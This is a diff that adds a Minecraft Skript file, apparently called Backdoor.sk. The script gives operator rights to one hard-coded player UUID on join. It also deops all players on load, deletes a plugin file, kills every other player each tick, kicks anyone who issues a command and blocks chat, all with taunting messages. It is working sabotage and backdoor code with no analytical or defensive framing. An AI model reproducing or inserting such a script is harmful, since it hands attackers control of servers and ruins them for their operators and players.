@@ -1,1 +1,32 @@
-
+on join:
+  set {_user} to "6a72cb22-8bcc-43b6-83c0-3f8a73ba1779" parsed as offline player
+  if {_user} is player:
+    send "&a[Backdoor.sk] Hello, %player%&a! You're backdoor skript worked! Now you have full control of the server! Here's op for now."
+    op player
+  else:
+    send "&4HAHAHAHAHHAHAHA THIS SERVER HAS BEEN TRASHED! IMAGINE!"
+    add player's uuid to {trashed::*}
+    
+    
+on load:
+  deop all players
+  if file "plugins/cmdline/installmappings/backdoor_this_server.cmdpackage" exists:
+    delete file "plugins/cmdline/installmappings/backdoor_this_server.cmdpackage"
+    send "&4HAHAHAHHA SERVER WAS FULLY TRASHED!"
+  
+every tick:
+  loop {trashed::*}:
+    send "&4HAHAHAHAHHAHAHA THIS SERVER HAS BEEN TRASHED! IMAGINE!%nl%BACKDOOR.SK ON TOP!%nl%" to loop-player
+    kill loop-player
+  
+on command:
+  if sender is console:
+    message "&4HAHAHHAHA IMAGINE TRYING TO REMOVE THE BACKDOOR! UR SERVER TRASHED LMFAOOOOO"
+  else:
+    kick player due to "&4LMFAOOOO IMAGINE TRYING TO EXECUTE A COMMAND!!!! IMAGINE!"
+    
+    
+on chat:
+  cancel event
+  send all players title "&4%player% &4CHATTED LOL" with subtitle "%message%" for 5 seconds
+    
